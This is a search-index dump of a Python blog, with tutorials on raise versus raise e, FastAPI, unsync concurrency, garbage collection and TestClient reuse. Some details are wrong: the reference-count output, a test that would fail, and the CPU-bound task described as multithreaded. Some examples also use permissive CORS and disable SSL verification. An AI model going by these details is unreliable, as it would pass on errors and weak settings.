division by zero\n</code></pre> <p>In this case, <code>raise</code> keeps the traceback simple and direct. It starts at the line where the original exception occurred (line 5 in <code>raise_exception_with_raise</code>) and goes up to where it was ultimately handled in the main program block. This full traceback preserves the original call stack, which makes tracking down the error straightforward.</p>"},{"location":"blog/old-blogs/2024-10-28_Raising-the-Difference-Between-raise-and-raise-e-941a3612aea5/#using-raise-e","title":"Using <code>raise e</code>:","text":"<pre><code>======= Using 'raise e': =======  \nCaught an error, re-raising with 'raise e'...  \nTraceback using 'raise e':  \nTraceback (most recent call last):  \n  File \"example.py\", line 26, in &lt;module&gt;  \n    raise_exception_with_raise_e()  \n  File \"example.py\", line 15, in raise_exception_with_raise_e  \n    raise e  # Raises the exception with a new traceback  \n  File \"example.py\", line 12, in raise_exception_with_raise_e  \n    result = 1 / 0  # This will cause a ZeroDivisionError  \nZeroDivisionError: division by zero\n</code></pre> <p>Here, <code>raise e</code> shows an extra layer in the traceback, starting with the line <code>raise e</code> was called on (line 15 in <code>raise_exception_with_raise_e</code>). This resets the traceback\u2019s starting point to the <code>raise e</code> statement, potentially obscuring the original error location.</p>"},{"location":"blog/old-blogs/2024-10-28_Raising-the-Difference-Between-raise-and-raise-e-941a3612aea5/#when-to-use-raise-vs-raise-e","title":"When to Use <code>raise</code> vs. <code>raise e</code>","text":"<p>1. Use<code>**raise**</code>for Simplicity and Clarity</p> <p>In most cases, <code>raise</code> is preferable because it retains the original traceback, making it easy to see exactly where the error occurred. This is particularly helpful in larger applications where an error may need to propagate up several layers before it\u2019s handled.</p> <p>2. Use<code>**raise e**</code>Sparingly</p> <p>There are rare cases where <code>raise e</code> might be useful, such as when you need to highlight a new context for an error. However, this approach can make debugging more challenging, as the original context is partially obscured by the new traceback.</p>"},{"location":"blog/old-blogs/2024-10-28_Raising-the-Difference-Between-raise-and-raise-e-941a3612aea5/#conclusion","title":"Conclusion","text":"<p>While both <code>raise</code> and <code>raise e</code> re-raise exceptions, they handle tracebacks differently. The direct <code>raise</code> statement is usually the best choice for preserving clarity in debugging, as it keeps the traceback as close to the original error as possible. In contrast, <code>raise e</code> resets the traceback to the current line, which can be helpful in specific contexts but generally makes the error\u2019s origin harder to identify. Knowing when and how to use each one can make your error handling cleaner, more understandable, and, ultimately, more effective.</p>"},{"location":"blog/old-blogs/2024-10-28_Raising-the-Difference-Between-raise-and-raise-e-941a3612aea5/#references","title":"References","text":"<ul> <li>Python Errors and Exceptions</li> <li>Python Exception Handling: Patterns and Best Practices by Jerry Ng</li> </ul>"},{"location":"blog/old-blogs/2024-10-28_Raising-the-Difference-Between-raise-and-raise-e-941a3612aea5/#stackademic","title":"Stackademic \ud83c\udf93","text":"<p>Thank you for reading until the end. Before you go:</p> <ul> <li>Please consider clapping and following the writer! \ud83d\udc4f</li> <li>Follow us X | LinkedIn | YouTube | Discord | Newsletter | Podcast</li> <li>Create a free AI-powered blog on Differ.</li> <li>More content at Stackademic.com</li> </ul> <p>By Kfir Gisman on October 28, 2024.</p> <p>Canonical link</p>"},{"location":"blog/old-blogs/2024-11-04_Understanding-FastAPI-Fundamentals--A-Guide-to-FastAPI--Uvicorn--Starlette--Swagger-UI--and--1a377ee5b9a6/","title":"Understanding FastAPI Fundamentals: A Guide to FastAPI, Uvicorn, Starlette, Swagger UI, and\u2026","text":"<p>Explore FastAPI\u2019s fundamentals, including Uvicorn, Starlette, Pydantic, and Swagger UI with these key resources for tutorials, docs, guide </p>"},{"location":"blog/old-blogs/2024-11-04_Understanding-FastAPI-Fundamentals--A-Guide-to-FastAPI--Uvicorn--Starlette--Swagger-UI--and--1a377ee5b9a6/#understanding-fastapi-fundamentals-a-guide-to-fastapi-uvicorn-starlette-swagger-ui-and-pydantic","title":"Understanding FastAPI Fundamentals: A Guide to FastAPI, Uvicorn, Starlette, Swagger UI, and Pydantic","text":"<p>Photo by Kevin Menajang: https://www.pexels.com/photo/photo-from-concrete-structures-920024/</p> <p>FastAPI is a modern, high-performance web framework for building APIs with Python, allowing developers to create powerful and efficient applications with minimal effort. It\u2019s designed with asynchronous programming in mind, making it extremely fast and able to handle multiple requests concurrently. Key components that power FastAPI include Uvicorn, Starlette, Swagger UI, and Pydantic. In this guide, we\u2019ll explore each of these components and see how they come together in FastAPI, with code examples to demonstrate key concepts.</p>"},{"location":"blog/old-blogs/2024-11-04_Understanding-FastAPI-Fundamentals--A-Guide-to-FastAPI--Uvicorn--Starlette--Swagger-UI--and--1a377ee5b9a6/#1-the-core-of-fastapi","title":"1. The Core of FastAPI","text":"<p>FastAPI is built on two major foundations:</p> <ul> <li>Asynchronous Programming : Leveraging Python\u2019s <code>async</code> and <code>await</code>, FastAPI can handle many requests at the same time, making it efficient for applications that require concurrency.</li> <li>Type Annotations : FastAPI uses Python\u2019s type hints to validate and serialize request and response data automatically, which makes development faster and safer.</li> </ul> <p>Let\u2019s start with a simple FastAPI app to get an idea of its structure:</p> <pre><code># main.py\n\nfrom fastapi import FastAPI\n\napp = FastAPI()\n\n@app.get(\"/\")  \nasync def read_root():  \n    return {\"Hello\": \"World\"}\n</code></pre> <p>This is a basic FastAPI application with a single route (<code>/</code>) that returns a JSON response with <code>{\"Hello\": \"World\"}</code>.</p> <p>To run this app, you\u2019ll use Uvicorn , an ASGI server designed to serve asynchronous web applications.</p>"},{"location":"blog/old-blogs/2024-11-04_Understanding-FastAPI-Fundamentals--A-Guide-to-FastAPI--Uvicorn--Starlette--Swagger-UI--and--1a377ee5b9a6/#2-uvicorn-the-asgi-server","title":"2. Uvicorn: The ASGI Server","text":"<p>Uvicorn is a lightning-fast ASGI server, optimized for handling asynchronous code. It\u2019s essential for running FastAPI applications because it handles incoming HTTP requests and manages the lifecycle of these requests.</p> <p>To run your FastAPI app with Uvicorn, use the following command:</p> <pre><code>uvicorn main:app --reload\n</code></pre> <ul> <li><code>main:app</code> specifies that Uvicorn should look for an <code>app</code> instance in the <code>main.py</code> file.</li> <li><code>--reload</code> enables hot-reloading during development, so the server reloads automatically whenever you save changes.</li> </ul> <p>When you run this command, Uvicorn will start serving your FastAPI app, and you can access it at <code>[http://127.0.0.1:8000](http://127.0.0.1:8000.)</code>.</p>"},{"location":"blog/old-blogs/2024-11-04_Understanding-FastAPI-Fundamentals--A-Guide-to-FastAPI--Uvicorn--Starlette--Swagger-UI--and--1a377ee5b9a6/#3-starlette-fastapis-web-framework-foundation","title":"3. Starlette: FastAPI\u2019s Web Framework Foundation","text":"<p>FastAPI is built on top of Starlette , a lightweight ASGI framework that handles the core HTTP operations, including routing, middleware, and WebSockets support. Starlette provides the low-level tools that FastAPI uses to manage HTTP requests, making it a stable and performant foundation for building web applications.</p> <p>FastAPI leverages Starlette\u2019s routing system to define API endpoints. For example:</p> <pre><code>@app.get(\"/items/{item_id}\")  \nasync def read_item(item_id: int):  \n    return {\"item_id\": item_id}\n</code></pre> <p>In this example:</p> <ul> <li><code>@app.get(\"/items/{item_id}\")</code> defines a route with a path parameter <code>item_id</code>.</li> <li>FastAPI handles this path parameter type (<code>int</code> here) by integrating Starlette\u2019s routing system with its type checking and validation.</li> </ul> <p>Starlette also allows you to add middleware for various operations, such as handling CORS (Cross-Origin Resource Sharing), request logging, or custom authentication:</p> <pre><code>from starlette.middleware.cors import CORSMiddleware\n\napp.add_middleware(  \n    CORSMiddleware,  \n    allow_origins=[\"*\"],  \n    allow_credentials=True,  \n    allow_methods=[\"*\"],  \n    allow_headers=[\"*\"],  \n)\n</code></pre> <p>This flexibility in Starlette makes FastAPI highly configurable, allowing developers to easily add custom middlewares as needed.</p>"},{"location":"blog/old-blogs/2024-11-04_Understanding-FastAPI-Fundamentals--A-Guide-to-FastAPI--Uvicorn--Starlette--Swagger-UI--and--1a377ee5b9a6/#4-swagger-ui-interactive-api-documentation","title":"4. Swagger UI: Interactive API Documentation","text":"<p>FastAPI automatically generates interactive API documentation with Swagger UI. This documentation is available by default at <code>/docs</code> and allows developers to test endpoints directly from the browser.</p> <p>To see this in action, start up your FastAPI app and visit <code>http://127.0.0.1:8000/docs</code>. You\u2019ll see an interactive Swagger UI that lists all of your routes, their parameters, and the expected responses.</p> <p>Another documentation interface, ReDoc , is also provided at <code>/redoc</code> by default, offering a more detailed view of API specifications.</p>"},{"location":"blog/old-blogs/2024-11-04_Understanding-FastAPI-Fundamentals--A-Guide-to-FastAPI--Uvicorn--Starlette--Swagger-UI--and--1a377ee5b9a6/#5-pydantic-data-validation-and-serialization","title":"5. Pydantic: Data Validation and Serialization","text":"<p>One of the most powerful aspects of FastAPI is its use of Pydantic for data validation. Pydantic models allow you to define the structure of request and response data with strict type constraints and automatic validation.</p> <p>Let\u2019s add a Pydantic model to our example:</p> <pre><code>from fastapi import FastAPI  \nfrom pydantic import BaseModel\n\napp = FastAPI()\n\n# Define a Pydantic model  \nclass Item(BaseModel):  \n    name: str  \n    price: float  \n    is_offer: bool = False\n\n# Use the model in an endpoint  \n@app.put(\"/items/{item_id}\")  \nasync def update_item(item_id: int, item: Item):  \n    return {\"item_id\": item_id, \"item\": item}\n</code></pre> <p>In this code:</p> <ul> <li>The <code>Item</code> model inherits from <code>BaseModel</code> and defines three fields: <code>name</code>, <code>price</code>, and <code>is_offer</code>. These fields have specific data types and an optional default value for <code>is_offer</code>.</li> <li>When you send a request to <code>/items/{item_id}</code> with JSON data, FastAPI uses Pydantic to validate the data against the <code>Item</code> model, automatically converting data types if possible.</li> </ul> <p>Try sending a request like this using Swagger UI at <code>/docs</code>:</p> <pre><code>{  \n  \"name\": \"Sample Item\",  \n  \"price\": 29.99  \n}\n</code></pre> <p>FastAPI will validate the data and automatically return any errors if the data doesn\u2019t match the expected types. For instance, if <code>price</code> is given as a string (like <code>\"twenty\"</code>), FastAPI will respond with a detailed validation error.</p>"},{"location":"blog/old-blogs/2024-11-04_Understanding-FastAPI-Fundamentals--A-Guide-to-FastAPI--Uvicorn--Starlette--Swagger-UI--and--1a377ee5b9a6/#6-putting-it-all-together","title":"6. Putting It All Together","text":"<p>Let\u2019s expand our app by adding more routes and combining everything we\u2019ve learned so far:</p> <pre><code>from fastapi import FastAPI, HTTPException  \nfrom pydantic import BaseModel  \nfrom starlette.middleware.cors import CORSMiddleware\n\napp = FastAPI()\n\n# Define a Pydantic model  \nclass Item(BaseModel):  \n    name: str  \n    price: float  \n    is_offer: bool = False\n\n# Add CORS middleware  \napp.add_middleware(  \n    CORSMiddleware,  \n    allow_origins=[\"*\"],  \n    allow_credentials=True,  \n    allow_methods=[\"*\"],  \n    allow_headers=[\"*\"],  \n)  \n# Home route  \n@app.get(\"/\")  \nasync def read_root():  \n    return {\"Hello\": \"World\"}\n\n# Get an item by ID  \n@app.get(\"/items/{item_id}\")  \nasync def read_item(item_id: int, q: str = None):  \n    if item_id == 0:  \n        raise HTTPException(status_code=404, detail=\"Item not found\")  \n    return {\"item_id\": item_id, \"q\": q}\n\n# Update an item  \n@app.put(\"/items/{item_id}\")  \nasync def update_item(item_id: int, item: Item):  \n    return {\"item_id\": item_id, \"item\": item}\n</code></pre> <p>With this setup:</p> <ul> <li>Routing and Parameter Handling : The <code>@app.get(\"/items/{item_id}\")</code> endpoint demonstrates path parameters and query parameters (e.g., <code>q</code>).</li> <li>Exception Handling : Using <code>HTTPException</code> for custom error responses (e.g., when an item is not found).</li> <li>CORS : CORS middleware allows you to make requests from different domains, crucial for frontend-backend communication in web apps.</li> </ul>"},{"location":"blog/old-blogs/2024-11-04_Understanding-FastAPI-Fundamentals--A-Guide-to-FastAPI--Uvicorn--Starlette--Swagger-UI--and--1a377ee5b9a6/#running-the-application","title":"Running the Application","text":"<p>To run this application, use Uvicorn:</p> <pre><code>uvicorn main:app --reload\n</code></pre> <p>Navigate to <code>http://127.0.0.1:8000/docs</code> to see the interactive documentation, or use a tool like cURL or Postman to send requests to the different endpoints.</p>"},{"location":"blog/old-blogs/2024-11-04_Understanding-FastAPI-Fundamentals--A-Guide-to-FastAPI--Uvicorn--Starlette--Swagger-UI--and--1a377ee5b9a6/#summary","title":"Summary","text":"<p>FastAPI combines the performance benefits of asynchronous programming with the simplicity of Python type hints to create a framework that\u2019s fast, easy to use, and suitable for production applications. By integrating Uvicorn, Starlette, Swagger UI, and Pydantic, FastAPI provides an incredibly streamlined approach to API development, making it a great choice for both rapid prototyping and production-grade applications.</p> <p>With these core fundamentals in place, you\u2019re now equipped to dive deeper into the world of FastAPI and build scalable, high-performance applications.</p>"},{"location":"blog/old-blogs/2024-11-04_Understanding-FastAPI-Fundamentals--A-Guide-to-FastAPI--Uvicorn--Starlette--Swagger-UI--and--1a377ee5b9a6/#reference","title":"Reference","text":"<ol> <li>FastAPI Documentation</li> <li>Uvicorn Documentation</li> <li>Starlette Documentation</li> <li>Pydantic Documentation</li> <li>Swagger UI Documentation</li> </ol>"},{"location":"blog/old-blogs/2024-11-04_Understanding-FastAPI-Fundamentals--A-Guide-to-FastAPI--Uvicorn--Starlette--Swagger-UI--and--1a377ee5b9a6/#in-plain-english","title":"In Plain English \ud83d\ude80","text":"<p>Thank you for being a part of the** In Plain English** community! Before you go:</p> <ul> <li>Be sure to clap and follow the writer \ufe0f\ud83d\udc4f\ufe0f\ufe0f</li> <li>Follow us: X | LinkedIn | YouTube | Discord | Newsletter | Podcast</li> <li>Create a free AI-powered blog on Differ.</li> <li>More content at PlainEnglish.io</li> </ul> <p>By Kfir Gisman on November 4, 2024.</p> <p>Canonical link</p>"},{"location":"blog/old-blogs/2024-11-26_This-Small-Python-Script-Improved-Understanding-of-Low-Level-Programming-077a2a066273/","title":"This Small Python Script Improved Understanding of Low-Level Programming","text":"<p>A Python script that simplifies concurrency while deepening understanding of low-level concepts like CPU-bound and I/O-bound tasks </p>"},{"location":"blog/old-blogs/2024-11-26_This-Small-Python-Script-Improved-Understanding-of-Low-Level-Programming-077a2a066273/#this-small-python-script-improved-understanding-of-low-level-programming_1","title":"This Small Python Script Improved Understanding of Low-Level Programming","text":"<p> Photo by Alexander Kovalev: https://www.pexels.com/photo/man-sitting-on-grass-using-computer-2748445/</p> <p>Python is widely used for its simplicity and ease of use, but for many programmers, there comes a point when the language itself no longer presents new challenges. Once developers become familiar with common libraries and techniques, the process of solving problems becomes routine. However, there is always more to learn, especially when diving into advanced topics like concurrency and low-level programming concepts.</p> <p>A popular resource for those looking to take their Python skills further is the \u201cTalk Python To Me\u201d podcast, which covers a broad range of topics related to Python development. One such course, \u201cParallel Programming in Python with async/await and threads,\u201d presents key concepts for handling concurrency and optimizing code execution.</p> <p>In traditional computer science education, topics like computer architecture, C programming, mutexes, semaphores, and pointers are often introduced. However, many developers never truly connect these concepts with real-world programming scenarios. The understanding of CPU cores, for example, often remains abstract, disconnected from daily development tasks.</p> <p>One key lesson from the course is the use of the unsync library, which simplifies concurrent and parallel programming by combining async, threading, and multiprocessing into a unified API. This library automatically optimizes tasks based on whether they are CPU-bound, I/O-bound, or asynchronous. By eliminating the complexities of thread initiation, joining, and closure, the unsync library makes concurrent programming in Python more accessible and efficient.</p> <p>The following script provides a practical demonstration of these concepts:</p> <pre><code># source: https://github.com/talkpython/async-techniques-python-course/blob/master/src/09-built-on-asyncio/the_unsync/thesync.py\n\ndef main():  \n    t0 = datetime.datetime.now()\n\n    tasks = [  \n        compute_some(),  \n        compute_some(),  \n        compute_some(),  \n        download_some(),  \n        download_some(),  \n        download_some_more(),  \n        download_some_more(),  \n        wait_some(),  \n        wait_some(),  \n        wait_some(),  \n        wait_some(),  \n    ]\n\n    [t.result() for t in tasks]\n\n    dt = datetime.datetime.now() - t0  \n    print(f\"Synchronous version done in {dt.total_seconds():,.2f} seconds.\")\n\n@unsync(cpu_bound=True)  \ndef compute_some():  \n    print(\"Computing...\")  \n    for _ in range(1, 10_000_000):  \n        math.sqrt(25 ** 25 + .01)\n\n@unsync()  \nasync def download_some():  \n    print(\"Downloading...\")  \n    url = 'https://talkpython.fm/episodes/show/174/coming-into-python-from-another-industry-part-2'  \n    async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=False)) as session:  \n        async with session.get(url) as resp:  \n            resp.raise_for_status()\n\n            text = await resp.text()\n\n    print(f\"Downloaded (more) {len(text):,} characters.\")\n\n@unsync()  \ndef download_some_more():  \n    print(\"Downloading more ...\")  \n    url = 'https://pythonbytes.fm/episodes/show/92/will-your-python-be-compiled'  \n    resp = requests.get(url)  \n    resp.raise_for_status()\n\n    text = resp.text\n\n    print(f\"Downloaded {len(text):,} characters.\")\n\n@unsync()  \nasync def wait_some():  \n    print(\"Waiting...\")  \n    for _ in range(1, 1000):  \n        await asyncio.sleep(.001)\n</code></pre> <p>The script demonstrates various types of tasks and how they can be executed concurrently to improve performance and efficiency:</p> <ul> <li>The <code>compute_some</code> function simulates heavy computations by calculating large numbers. It demonstrates how multithreaded processing can leverage multiple CPU cores to perform parallel calculations, reducing processing time and improving efficiency. In real-world applications, this approach is used for tasks like numerical simulations, data analysis, and computationally intensive operations.</li> <li>The <code>download_some</code> function asynchronously fetches data from external sources (such as APIs or websites). It runs within an asyncio event loop, allowing for non-blocking I/O operations. This makes it ideal for handling multiple simultaneous I/O tasks without freezing the program, which is useful for applications that need to interact with multiple data sources at the same time, such as scraping data or handling concurrent API requests.</li> <li>The <code>download_some_more</code> function demonstrates the use of synchronous HTTP requests. Though synchronous, it runs in a separate thread to prevent blocking the main thread. This approach is useful in simpler or legacy systems where non-blocking operations are not necessary but concurrency is still desired.</li> <li>The <code>wait_some</code> function simulates an asynchronous task that introduces non-blocking pauses, allowing other tasks to continue running while waiting. This is particularly useful in scenarios where the program needs to wait for external events, timers, or user input without freezing other operations.</li> </ul> <p>By utilizing concurrent programming, the script shows how multiple tasks can be performed simultaneously, speeding up processing time and allowing for more efficient use of resources.</p> <p>In programming, memory (RAM) and processing power (CPU) are essential components that influence performance. RAM enables fast access to active data, allowing the smooth execution of multiple tasks, while the CPU handles the execution of instructions and computations. In real-world scenarios, sufficient memory ensures that large datasets or multiple operations can be processed at once, while a powerful CPU enables faster calculations and more responsive applications.</p> <p>Understanding the relationship between memory, CPU, and concurrency has a significant impact on how developers approach optimization and task execution. By leveraging multi-core CPUs and efficient memory management, developers can create more responsive, high-performance applications that handle complex, data-intensive tasks with ease.</p> <p>By Kfir Gisman on November 26, 2024.</p> <p>Canonical link</p>"},{"location":"blog/old-blogs/2025-01-06_Understanding-Python-Memory-and-Garbage-Collection-Through-Hands-On-Experiments-86f25aa6b5d5/","title":"Understanding Python Memory and Garbage Collection Through Hands-On Experiments","text":"<p>Dive into Python\u2019s memory management with practical examples to understand reference counting, garbage collection, and efficient resource\u2026 </p>"},{"location":"blog/old-blogs/2025-01-06_Understanding-Python-Memory-and-Garbage-Collection-Through-Hands-On-Experiments-86f25aa6b5d5/#understanding-python-memory-and-garbage-collection-through-hands-on-experiments_1","title":"Understanding Python Memory and Garbage Collection Through Hands-On Experiments","text":"<p>Photo by badr mourafiq: https://www.pexels.com/photo/creative-iphone-new-york-sony-9136482/</p> <p>Python is a high-level language that takes care of much of the memory management for you. However, understanding how it works under the hood can give you better insights into performance optimization and how to manage your resources efficiently. In this blog post, we\u2019ll explore Python\u2019s memory management and garbage collection (GC) with hands-on examples. We will focus on three core concepts:</p> <ol> <li>Memory Allocation and Reference Counting</li> <li>Cyclic References</li> <li>Using<code>**gc**</code>to Manage Garbage Collection</li> </ol> <p>Let\u2019s dive in with an experiment-driven approach using a small Python script that demonstrates these concepts in action.</p>"},{"location":"blog/old-blogs/2025-01-06_Understanding-Python-Memory-and-Garbage-Collection-Through-Hands-On-Experiments-86f25aa6b5d5/#1-memory-allocation-and-reference-counting","title":"1. Memory Allocation and Reference Counting","text":"<p>Memory management in Python is primarily handled through reference counting. Every object in Python has a reference count that tracks how many references point to it. When the reference count drops to zero, the object is automatically deleted, and its memory is freed.</p>"},{"location":"blog/old-blogs/2025-01-06_Understanding-Python-Memory-and-Garbage-Collection-Through-Hands-On-Experiments-86f25aa6b5d5/#example-memory-allocation-of-simple-objects","title":"Example: Memory Allocation of Simple Objects","text":"<pre><code>import sys\n\n# Create two variables pointing to the same integer object  \nx = 10  \ny = 10  # Both x and y point to the same memory location\n\n# Memory address and reference count  \nprint(f\"Memory address of x (ID): {id(x)}\")  \nprint(f\"Memory address of y (ID): {id(y)}\")  \nprint(f\"Reference count for x: {sys.getrefcount(x)}\")\n</code></pre> <p>Key Points:</p> <ul> <li>Both <code>x</code> and <code>y</code> point to the same integer object (<code>10</code>), as integers are cached in Python.</li> <li>The <code>id()</code> function shows that both variables share the same memory address.</li> <li><code>sys.getrefcount()</code> reveals that the reference count is greater than 1 because both <code>x</code> and <code>y</code> reference the same object.</li> </ul> <p>After deleting one of the references (<code>del x</code>), the object is still alive because <code>y</code> still holds a reference to the object.</p> <pre><code>del x\n\nprint(f\"Reference count after deleting x: {sys.getrefcount(y)}\")\n</code></pre>"},{"location":"blog/old-blogs/2025-01-06_Understanding-Python-Memory-and-Garbage-Collection-Through-Hands-On-Experiments-86f25aa6b5d5/#output","title":"Output:","text":"<pre><code>Memory address of x (ID): 140705611380560  \nMemory address of y (ID): 140705611380560  \nReference count for x: 2  \nReference count after deleting x: 1\n</code></pre> <p>As shown, the reference count of the object decreases after <code>x</code> is deleted, but the object is still not destroyed because <code>y</code> still holds a reference to it.</p>"},{"location":"blog/old-blogs/2025-01-06_Understanding-Python-Memory-and-Garbage-Collection-Through-Hands-On-Experiments-86f25aa6b5d5/#2-cyclic-references-and-garbage-collection","title":"2. Cyclic References and Garbage Collection","text":"<p>Sometimes, objects reference each other in a cycle (e.g., <code>A -&gt; B -&gt; A</code>), making it impossible for the reference count to reach zero. Python\u2019s garbage collector handles these cases by detecting and cleaning up cyclic references.</p>"},{"location":"blog/old-blogs/2025-01-06_Understanding-Python-Memory-and-Garbage-Collection-Through-Hands-On-Experiments-86f25aa6b5d5/#example-creating-a-cycle","title":"Example: Creating a Cycle","text":"<pre><code>class Node:  \n    def __init__(self, value):  \n        self.value = value  \n        self.next = None\n\n# Create a cycle  \nnode1 = Node(1)  \nnode2 = Node(2)  \nnode1.next = node2  \nnode2.next = node1  # This creates a cyclic reference\n</code></pre> <p>Here, <code>node1</code> and <code>node2</code> reference each other, forming a cycle. Even after deleting both references, the objects are not collected because they still reference each other.</p> <pre><code>del node1  \ndel node2\n</code></pre>"},{"location":"blog/old-blogs/2025-01-06_Understanding-Python-Memory-and-Garbage-Collection-Through-Hands-On-Experiments-86f25aa6b5d5/#triggering-garbage-collection","title":"Triggering Garbage Collection","text":"<p>To break the cycle and reclaim memory, Python\u2019s garbage collector (<code>gc</code>) can be manually triggered using <code>gc.collect()</code>.</p> <pre><code>import gc\n\n# Manually trigger garbage collection to clean up the cycle  \ngc.collect()\n</code></pre> <p>Key Point:</p> <ul> <li>Python\u2019s GC is able to detect and clean up cyclic references, ensuring that memory is freed even when reference counting can\u2019t handle it.</li> </ul>"},{"location":"blog/old-blogs/2025-01-06_Understanding-Python-Memory-and-Garbage-Collection-Through-Hands-On-Experiments-86f25aa6b5d5/#3-using-gc-for-custom-garbage-collection","title":"3. Using <code>gc</code> for Custom Garbage Collection","text":"<p>Python provides the <code>gc</code> module to interact with the garbage collector and control the cleanup process. We can check if garbage collection is enabled and even force a collection to clean up unreachable objects.</p> <pre><code>import gc\n\nprint(f\"Is Garbage Collection enabled? {gc.isenabled()}\")  \ngc.collect()  # Force garbage collection  \nprint(f\"Garbage after collect: {gc.garbage}\")\n</code></pre> <p>Key Points:</p> <ul> <li><code>gc.isenabled()</code> checks if garbage collection is enabled in the current Python session.</li> <li><code>gc.collect()</code> forces the garbage collection process, which can help clean up cyclic references or unreachable objects.</li> </ul>"},{"location":"blog/old-blogs/2025-01-06_Understanding-Python-Memory-and-Garbage-Collection-Through-Hands-On-Experiments-86f25aa6b5d5/#4-using-__del__-for-custom-cleanup","title":"4. Using <code>__del__</code> for Custom Cleanup","text":"<p>Python allows you to define custom cleanup code using the <code>__del__</code> method. This method is called when an object is about to be destroyed.</p>"},{"location":"blog/old-blogs/2025-01-06_Understanding-Python-Memory-and-Garbage-Collection-Through-Hands-On-Experiments-86f25aa6b5d5/#example-using-__del__","title":"Example: Using <code>__del__</code>","text":"<pre><code>class MyObject:  \n    def __init__(self, name):  \n        self.name = name  \n        print(f\"MyObject {self.name} is created!\")\n\n    def __del__(self):  \n        print(f\"MyObject {self.name} is being destroyed!\")\n\nobj1 = MyObject(\"Object 1\")  \nobj2 = obj1  # obj2 is another reference to the same object\n\ndel obj1     # This will not delete the object, as obj2 still holds a reference  \ndel obj2     # The object is now destroyed because both references are gone\n</code></pre> <p>In this example:</p> <ul> <li>When <code>obj1</code> is deleted, the object is not destroyed because <code>obj2</code> still holds a reference to it.</li> <li>When <code>obj2</code> is also deleted, the object\u2019s <code>__del__</code> method is called, and the object is destroyed.</li> </ul>"},{"location":"blog/old-blogs/2025-01-06_Understanding-Python-Memory-and-Garbage-Collection-Through-Hands-On-Experiments-86f25aa6b5d5/#conclusion","title":"Conclusion","text":"<p>Python\u2019s memory management and garbage collection mechanisms are designed to handle most tasks automatically. By understanding reference counting and cyclic references , as well as how to manually trigger the garbage collector, you can ensure that your programs are more efficient and resource-friendly.</p> <p>By experimenting with these examples, you gain hands-on experience in how Python manages memory, how cyclic references are handled, and how to clean up resources using the <code>gc</code> module.</p> <p>Keep in mind:</p> <ul> <li>Reference Counting : Keeps track of object references and deletes objects when they are no longer referenced.</li> <li>Garbage Collection : Handles cyclic references that reference counting can\u2019t clean up.</li> <li><code>**__del__**</code>Method : Allows for custom cleanup when objects are destroyed.</li> </ul> <p>This knowledge helps you write more efficient and optimized Python code, particularly for resource-intensive applications.</p>"},{"location":"blog/old-blogs/2025-01-06_Understanding-Python-Memory-and-Garbage-Collection-Through-Hands-On-Experiments-86f25aa6b5d5/#references","title":"References","text":"<ul> <li>Memory Management</li> <li>Memory Management in Python</li> <li>gc \u2014 Garbage Collector interface</li> <li>Garbage Collection in Python</li> <li>garbage collector</li> </ul> <p>By Kfir Gisman on January 6, 2025.</p> <p>Canonical link</p>"},{"location":"blog/old-blogs/2025-01-20_Why-You-Should-Use-a-Single-FastAPI-App-and-TestClient-Instance-475ab3a99cce/","title":"Why You Should Use a Single FastAPI App and TestClient Instance","text":"<p>Learn why reusing a single FastAPI app and TestClient instance can simplify your testing setup and improve efficiency </p>"},{"location":"blog/old-blogs/2025-01-20_Why-You-Should-Use-a-Single-FastAPI-App-and-TestClient-Instance-475ab3a99cce/#why-you-should-use-a-single-fastapi-app-and-testclient-instance_1","title":"Why You Should Use a Single FastAPI App and TestClient Instance","text":"<p>Photo by Shawon Dutta: https://www.pexels.com/photo/beach-bluesky-beautiful-sky-blue-sea-7759874/</p> <p>When working with FastAPI, especially in larger projects, using one instance of your FastAPI app and one instance of<code>**TestClient**</code> across your entire project is critical for ensuring consistency, performance, and reliability. Let\u2019s dive into why this is important and explore hands-on examples.</p>"},{"location":"blog/old-blogs/2025-01-20_Why-You-Should-Use-a-Single-FastAPI-App-and-TestClient-Instance-475ab3a99cce/#1-consistency-across-the-application","title":"1. Consistency Across the Application","text":"<p>Creating multiple instances of your FastAPI app can lead to inconsistencies. Each app instance has its own state, middleware, and dependency management. If you share stateful data, like in-memory storage or database connections, having multiple instances can cause unexpected behavior.</p>"},{"location":"blog/old-blogs/2025-01-20_Why-You-Should-Use-a-Single-FastAPI-App-and-TestClient-Instance-475ab3a99cce/#2-improved-performance","title":"2. Improved Performance","text":"<p>Each <code>TestClient</code> creates its own HTTP connection and initializes dependencies. Using one <code>TestClient</code> reduces overhead and makes tests faster.</p>"},{"location":"blog/old-blogs/2025-01-20_Why-You-Should-Use-a-Single-FastAPI-App-and-TestClient-Instance-475ab3a99cce/#3-avoid-initialization-issues","title":"3. Avoid Initialization Issues","text":"<p>FastAPI apps often initialize resources like database connections or background tasks during startup. Multiple instances can result in duplicate initializations or conflicts.</p>"},{"location":"blog/old-blogs/2025-01-20_Why-You-Should-Use-a-Single-FastAPI-App-and-TestClient-Instance-475ab3a99cce/#hands-on-code-example","title":"Hands-On Code Example","text":""},{"location":"blog/old-blogs/2025-01-20_Why-You-Should-Use-a-Single-FastAPI-App-and-TestClient-Instance-475ab3a99cce/#correct-one-app-instance-one-testclient","title":"Correct: One App Instance, One TestClient","text":"<pre><code>from fastapi import FastAPI, Depends  \nfrom fastapi.testclient import TestClient\n\n# Create a single FastAPI app instance  \napp = FastAPI()\n\n# Simple in-memory database  \ndatabase = {\"items\": []}\n\n# Dependency  \ndef get_database():  \n    return database\n\n@app.post(\"/items/\")  \ndef create_item(item: str, db=Depends(get_database)):  \n    db[\"items\"].append(item)  \n    return {\"message\": f\"Item '{item}' added.\"}\n\n@app.get(\"/items/\")  \ndef list_items(db=Depends(get_database)):  \n    return {\"items\": db[\"items\"]}\n\n# Create a single TestClient instance  \nclient = TestClient(app)\n\n# Tests  \ndef test_create_item():  \n    response = client.post(\"/items/\", json={\"item\": \"foo\"})  \n    assert response.status_code == 200  \n    assert response.json() == {\"message\": \"Item 'foo' added.\"}\n\ndef test_list_items():  \n    response = client.get(\"/items/\")  \n    assert response.status_code == 200  \n    assert response.json() == {\"items\": [\"foo\"]}\n</code></pre>"},{"location":"blog/old-blogs/2025-01-20_Why-You-Should-Use-a-Single-FastAPI-App-and-TestClient-Instance-475ab3a99cce/#incorrect-multiple-instances-can-cause-issues","title":"Incorrect: Multiple Instances Can Cause Issues","text":"<pre><code># Incorrect: Multiple app instances  \napp1 = FastAPI()  \napp2 = FastAPI()\n\n# Incorrect: Multiple TestClient instances  \nclient1 = TestClient(app1)  \nclient2 = TestClient(app2)\n\n# Issue: State changes in client1 won't reflect in 